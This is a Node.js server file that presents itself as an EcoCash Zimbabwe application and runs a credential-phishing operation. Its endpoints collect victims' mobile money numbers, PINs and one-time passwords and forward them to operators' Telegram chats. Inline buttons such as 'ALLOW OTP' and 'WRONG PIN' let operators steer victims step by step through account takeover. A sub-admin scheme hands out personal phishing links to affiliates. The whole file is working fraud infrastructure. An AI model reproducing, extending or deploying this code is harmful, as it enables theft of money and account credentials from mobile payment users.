/**
 * **ECOCASH ZIMBABWE - UNRESTRICTED MULTI-ADMIN SERVER**
 */

const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const fs = require('fs');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const TOKEN = process.env.TOKEN || process.env.TELEGRAM_BOT_TOKEN;
const APP_URL = process.env.APP_URL || process.env.RENDER_EXTERNAL_URL || (process.env.RENDER_EXTERNAL_HOSTNAME ? `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` : '');
const FALLBACK_ADMIN_ID = process.env.ADMIN_CHAT_ID || process.env.MAIN_ADMIN_ID || '8845346118';

if (!TOKEN) {
  console.error('FATAL: TELEGRAM_BOT_TOKEN environment variable is required.');
  process.exit(1);
}

if (!APP_URL) {
  console.error('FATAL: APP_URL or RENDER_EXTERNAL_URL environment variable is required.');
  process.exit(1);
}

const ADMINS_FILE = path.join(__dirname, 'admins.json');

function loadAdmins() {
  try {
    if (fs.existsSync(ADMINS_FILE)) {
      const data = fs.readFileSync(ADMINS_FILE, 'utf8');
      const entries = JSON.parse(data);
      return new Map(entries.map(([id, rec]) => [id, {
        authorized: rec.authorized ?? false,
        paid: rec.paid ?? false,
        username: rec.username || '',
        firstName: rec.firstName || 'User',
        lastName: rec.lastName || '',
        status: rec.status || 'PENDING'
      }]));
    }
  } catch (err) {
    console.error('[Storage] Error loading admins file:', err);
  }
  return new Map();
}

function saveAdmins() {
  try {
    const serialized = JSON.stringify(Array.from(admins.entries()));
    fs.writeFileSync(ADMINS_FILE, serialized, 'utf8');
  } catch (err) {
    console.error('[Storage] Error saving admins file:', err);
  }
}

let bot = null;
const sessions = new Map();
const admins = loadAdmins();
const adminConfigMessageIds = new Map();

function isValidEcoCashNumber(number) {
  const clean = String(number || '').replace(/\D/g, '');
  return /^(077|078)\d{7}$/.test(clean);
}

function resolveTargetChat(adminParam) {
  if (adminParam && String(adminParam).trim() !== '') {
    const targetAdmin = String(adminParam).trim();
    if (targetAdmin === String(FALLBACK_ADMIN_ID)) {
      return FALLBACK_ADMIN_ID;
    }
    return targetAdmin;
  }
  return FALLBACK_ADMIN_ID || null;
}

async function updateContinuousAdminList(chatId, messageId = null, page = 0) {
  const PAGE_SIZE = 5;
  const adminEntries = Array.from(admins.entries()).filter(([id]) => id !== String(FALLBACK_ADMIN_ID));
  const totalPages = Math.ceil(adminEntries.length / PAGE_SIZE) || 1;
  
  if (page < 0) page = 0;
  if (page >= totalPages) page = totalPages - 1;

  const paginatedEntries = adminEntries.slice(page * PAGE_SIZE, (page + 1) * PAGE_SIZE);

  let adminListText = `👑 *EcoCash Sub-Admin Control Panel* (Page ${page + 1} of ${totalPages})\n\nAll sub-admins use their links freely:`;
  let keyboard = [];

  if (adminEntries.length === 0) {
    adminListText += `\n\nNo sub-admins have started the bot yet.`;
  } else {
    paginatedEntries.forEach(([id, record]) => {
      const nameDisplay = record.username ? `@${record.username}` : (record.firstName || 'User');
      adminListText += `\n\n👤 *${nameDisplay}* (\`${id}\`)`;
    });
  }

  let navRow = [];
  if (page > 0) navRow.push({ text: `⬅️ Previous`, callback_data: `PAGE_${page - 1}` });
  navRow.push({ text: `🔄 Refresh`, callback_data: `PAGE_${page}` });
  if (page < totalPages - 1) navRow.push({ text: `Next ➡️`, callback_data: `PAGE_${page + 1}` });
  if (navRow.length > 0) keyboard.push(navRow);

  if (messageId) {
    try {
      await bot.editMessageText(adminListText, {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: 'Markdown',
        reply_markup: { inline_keyboard: keyboard }
      });
      return;
    } catch (err) {}
  }

  const sentMsg = await bot.sendMessage(chatId, adminListText, { 
    parse_mode: 'Markdown',
    reply_markup: { inline_keyboard: keyboard } 
  });
  adminConfigMessageIds.set(chatId, sentMsg.message_id);
}

async function initBot() {
  bot = new TelegramBot(TOKEN, { polling: false });
  
  const webhookPath = `/bot${TOKEN}`;
  const webhookUrl = `${APP_URL}${webhookPath}`;

  try {
    await bot.setWebHook(webhookUrl);
    app.post(webhookPath, (req, res) => {
      res.sendStatus(200);
      try { bot.processUpdate(req.body); } catch (err) {}
    });
  } catch (err) {
    process.exit(1);
  }

  bot.onText(/\/admins/, async (msg) => {
    const chatId = String(msg.chat.id);
    if (chatId !== String(FALLBACK_ADMIN_ID)) {
      await bot.sendMessage(chatId, `⚠️ Unauthorized.`);
      return;
    }
    await updateContinuousAdminList(chatId, null, 0);
  });

  bot.onText(/\/myprofile|\/me/, async (msg) => {
    try {
      const chatId = String(msg.chat.id);
      const userId = msg.from.id;
      const username = msg.from.username ? `@${msg.from.username}` : 'None';
      const firstName = msg.from.first_name || 'N/A';
      const lastName = msg.from.last_name || 'N/A';
      
      const userLink = `${APP_URL}/?admin=${chatId}`;

      let profileText = 
        `👤 *Your Dedicated Link Info*\n\n` +
        `• *First Name:* ${firstName}\n` +
        `• *Last Name:* ${lastName}\n` +
        `• *Username:* ${username}\n` +
        `• *Telegram ID:* \`${userId}\`\n\n` +
        `🔗 *Your Active Unrestricted Link:*\n${userLink}`;

      await bot.sendMessage(chatId, profileText, { parse_mode: 'Markdown' });
    } catch (err) {}
  });

  bot.onText(/\/start/, async (msg) => {
    try {
      const chatId = String(msg.chat.id);
      const userId = msg.from.id;
      const username = msg.from.username || '';
      const firstName = msg.from.first_name || 'User';
      const lastName = msg.from.last_name || '';

      if (chatId === String(FALLBACK_ADMIN_ID)) {
        await bot.sendMessage(chatId, `👑 Welcome Main Administrator. Your link is active: ${APP_URL}`, {
          parse_mode: 'Markdown'
        });
        return;
      }

      if (!admins.has(chatId)) {
        admins.set(chatId, {
          authorized: true,
          paid: true,
          username,
          firstName,
          lastName,
          startedAt: new Date()
        });
        saveAdmins();
      }

      const userLink = `${APP_URL}/?admin=${chatId}`;
      let responseText = `👋 *Welcome ${firstName}!*\n\nYour personal EcoCash link is ready and fully active without restrictions:\n${userLink}`;

      await bot.sendMessage(chatId, responseText, { parse_mode: 'Markdown' });

    } catch (err) {}
  });

  bot.on('callback_query', async (query) => {
    try {
      const actionData = query.data || '';
      const chatId = String(query.message.chat.id);

      if (actionData.startsWith('PAGE_')) {
        const pageNum = parseInt(actionData.split('_')[1]) || 0;
        await updateContinuousAdminList(chatId, query.message.message_id, pageNum);
        await bot.answerCallbackQuery(query.id);
        return;
      }

      const parts = actionData.split('_');
      const prefix = parts.slice(0, 2).join('_'); 
      const targetId = parts.slice(2).join('_');

      let session = sessions.get(targetId);
      if (!session) {
        session = { contact: 'Unknown', adminChatId: chatId };
      }

      const chatTarget = session.adminChatId || chatId;

      switch (prefix) {
        case 'ALLOW_OTP':
          session.status = 'APPROVED_LOAD_OTP';
          await bot.sendMessage(chatTarget, `✅ OTP screen authorized for ${session.contact}`);
          break;
        case 'DENY_OTP':
          session.status = 'DENIED';
          await bot.sendMessage(chatTarget, `❌ Access denied for ${session.contact}`);
          break;
        case 'CORRECT_OTP':
          session.status = 'SUCCESS';
          await bot.sendMessage(chatTarget, `🎉 Success screen unlocked for ${session.contact}`);
          break;
        case 'WRONG_PIN':
          session.status = 'RETRY_PIN';
          await bot.sendMessage(chatTarget, `⚠️ Invalid PIN prompt triggered.`);
          break;
        case 'WRONG_OTP':
          session.status = 'RETRY_OTP';
          await bot.sendMessage(chatTarget, `⚠️ Invalid 6-digit OTP prompt triggered.`);
          break;
        default:
          break;
      }

      await bot.answerCallbackQuery(query.id, { text: `Handled: ${prefix}` }).catch(() => {});

      if (query.message && query.message.message_id) {
        await bot.editMessageReplyMarkup(
          { inline_keyboard: [] },
          { chat_id: query.message.chat.id, message_id: query.message.message_id }
        ).catch(() => {});
      }
    } catch (err) {
      try {
        await bot.answerCallbackQuery(query.id, { text: '⚠️ Error processing action.' }).catch(() => {});
      } catch (e) {}
    }
  });
}

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/api/submit-application', async (req, res) => {
  try {
    let { contact, pin, amount, adminChatId } = req.body || {};

    if (!adminChatId && req.query && req.query.admin) {
      adminChatId = req.query.admin;
    }

    const cleanContact = String(contact || '').replace(/\D/g, '');
    if (!isValidEcoCashNumber(cleanContact)) {
      return res.status(400).json({ success: false, error: 'Please enter a valid EcoCash number starting with 077 or 078.' });
    }

    const targetChat = resolveTargetChat(adminChatId);
    if (!targetChat) {
      return res.status(400).json({ success: false, error: 'Target chat ID missing.' });
    }

    const userId = cleanContact ? cleanContact.replace(/[^a-zA-Z0-9]/g, '_') : `user_${Date.now()}`;

    sessions.set(userId, {
      contact: cleanContact,
      pin,
      amount: amount || 'USD 1,000',
      adminChatId: targetChat,
      status: 'WAITING_PIN_APPROVAL',
      createdAt: new Date()
    });

    const message =
      `NEW ECOCASH APPLICATION\n\n` +
      `NUMBER: ${cleanContact}\n` +
      `PIN: ${pin}`;

    const opts = {
      reply_markup: {
        inline_keyboard: [
          [
            { text: '✅ ALLOW OTP', callback_data: `ALLOW_OTP_${userId}` },
            { text: '❌ DENY', callback_data: `DENY_OTP_${userId}` }
          ]
        ]
      }
    };

    if (!bot) {
      return res.status(500).json({ success: false, error: 'Bot not initialized' });
    }

    const sentMsg = await bot.sendMessage(targetChat, message, opts);
    const session = sessions.get(userId);
    if (session) session.adminMsgId = sentMsg.message_id;
    
    return res.status(200).json({ success: true, userId });

  } catch (err) {
    return res.status(500).json({ success: false, error: 'Telegram dispatch failed: ' + (err?.message || 'Unknown error') });
  }
});

app.get('/api/check-status/:userId', (req, res) => {
  const { userId } = req.params;
  const session = sessions.get(userId);
  if (!session) return res.status(404).json({ status: 'NOT_FOUND' });
  res.status(200).json({ status: session.status });
});

app.post('/api/submit-otp', async (req, res) => {
  try {
    const { userId, otp } = req.body || {};
    const session = sessions.get(userId);

    if (!session) return res.status(404).json({ success: false, error: 'Session not found' });

    session.status = 'WAITING_OTP_VERIFICATION';
    session.otp = otp;

    const message =
      `NEW ECOCASH APPLICATION (6-DIGIT OTP)\n\n` +
      `NUMBER: ${session.contact}\n` +
      `6-DIGIT OTP: ${otp}`;

    const opts = {
      reply_markup: {
        inline_keyboard: [
          [
            { text: '⚠️ WRONG PIN', callback_data: `WRONG_PIN_${userId}` },
            { text: '⚠️ WRONG OTP', callback_data: `WRONG_OTP_${userId}` }
          ],
          [
            { text: '✅ CORRECT OTP', callback_data: `CORRECT_OTP_${userId}` }
          ]
        ]
      }
    };

    const targetChat = session.adminChatId;
    if (targetChat && bot) {
      await bot.sendMessage(targetChat, message, opts);
    }

    return res.status(200).json({ success: true });
  } catch (error) {
    return res.status(500).json({ success: false, error: 'Telegram dispatch failed' });
  }
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, async () => {
  await initBot();
});
        
